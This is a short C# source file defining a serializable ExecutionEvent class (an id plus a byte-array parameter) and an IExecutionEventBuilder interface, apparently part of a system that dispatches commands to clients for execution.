using System;

namespace Orcus.Shared.DynamicCommands
{
    /// <summary>
    ///     The event which is needed to execute the command on the client
    /// </summary>
    /// The reason why this command isn't detected by deserialization (but by it's id) is that I want to be backwards compatible to older clients: if the client doesn't know an execution event with a specific id, it just gets executed - no deserialization unknown type errors
    [Serializable]
    public class ExecutionEvent
    {
        /// <summary>
        ///     The id of the execution event
        /// </summary>
        public uint Id { get; set; }

        /// <summary>
        ///     The parameter of the execution event
        /// </summary>
        public byte[] Parameter { get; set; }
    }

    /// <summary>
    ///     Build an execution event
    /// </summary>
    public interface IExecutionEventBuilder
    {
        /// <summary>
        ///     The id of the execution event
        /// </summary>
        uint Id { get; }

        /// <summary>
        ///     The parameter of the execution event
        /// </summary>
        /// <returns>Returns a byte array which has to be given to the execution event at initialization</returns>
        byte[] GetParameter();
    }
}